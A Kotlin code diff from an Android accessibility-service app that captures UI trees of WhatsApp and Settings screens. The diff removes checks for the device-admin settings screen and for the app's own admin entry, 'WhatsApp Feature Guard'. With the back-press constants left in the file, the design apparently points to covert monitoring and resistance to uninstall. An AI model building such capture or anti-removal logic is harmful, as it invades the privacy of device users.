@@ -48,9 +48,6 @@ companion object {
     private const val BACK_PRESS_INTERVAL_MS = 300L
     private const val MAX_BACK_PRESSES = 6
 
-    private const val DEVICE_ADMIN_SCREEN_TITLE = "Device admin apps"
-    private const val DEVICE_ADMIN_APP_TITLE = "WhatsApp Feature Guard"
-
     @Volatile
     var lastCaptureStatus: String = "Waiting for WhatsApp"
         private set
@@ -788,9 +785,7 @@ private fun captureScreen(
     val packageName = event.packageName?.toString() ?: "(null)"
     val rootPackage = root.packageName?.toString() ?: "(null)"
     val nodeCount = intArrayOf(0)
-    val appNameFound = booleanArrayOf(false)
-    val adminTitleFound = booleanArrayOf(false)
-
+    
     output.appendLine()
     output.appendLine("==================================================")
     output.appendLine("DETAILED CAPTURE: $timestamp")
@@ -809,16 +804,12 @@ private fun captureScreen(
         node = root,
         output = output,
         depth = 0,
-        counter = nodeCount,
-        appNameFound = appNameFound,
-        adminTitleFound = adminTitleFound
+        counter = nodeCount
     )
 
     output.appendLine()
     output.appendLine("========== CAPTURE SUMMARY ==========")
     output.appendLine("TOTAL_NODES: ${nodeCount[0]}")
-    output.appendLine("APP_NAME_FOUND: ${appNameFound[0]}")
-    output.appendLine("DEVICE_ADMIN_TITLE_FOUND: ${adminTitleFound[0]}")
     output.appendLine("PACKAGE_IS_SETTINGS: ${packageName == "com.android.settings"}")
     output.appendLine("=====================================")
 
@@ -833,18 +824,14 @@ private fun captureScreen(
     lastCaptureTime = now
 
     lastCaptureStatus =
-        "Captured ${nodeCount[0]} UI elements; " +
-            "appNameFound=${appNameFound[0]}; " +
-            "adminTitleFound=${adminTitleFound[0]}"
+        "Captured ${nodeCount[0]} UI elements"
 }
 
 private fun appendNodeTree(
     node: AccessibilityNodeInfo,
     output: StringBuilder,
     depth: Int,
-    counter: IntArray,
-    appNameFound: BooleanArray,
-    adminTitleFound: BooleanArray
+    counter: IntArray
 ) {
     if (counter[0] >= MAX_NODES || depth > MAX_DEPTH) return
 
@@ -856,22 +843,6 @@ private fun appendNodeTree(
         node.viewIdResourceName
     } catch (_: Exception) {
         null
-    }
-
-    val searchableText = listOfNotNull(text, description)
-
-    if (searchableText.any {
-            it.contains(DEVICE_ADMIN_APP_TITLE, ignoreCase = true)
-        }
-    ) {
-        appNameFound[0] = true
-    }
-
-    if (searchableText.any {
-            it.contains(DEVICE_ADMIN_SCREEN_TITLE, ignoreCase = true)
-        }
-    ) {
-        adminTitleFound[0] = true
     }
 
     val indent = "  ".repeat(depth.coerceAtMost(MAX_DEPTH))
@@ -917,9 +888,7 @@ private fun appendNodeTree(
                 node = child,
                 output = output,
                 depth = depth + 1,
-                counter = counter,
-                appNameFound = appNameFound,
-                adminTitleFound = adminTitleFound
+                counter = counter
             )
         } catch (e: Exception) {
             output.appendLine(
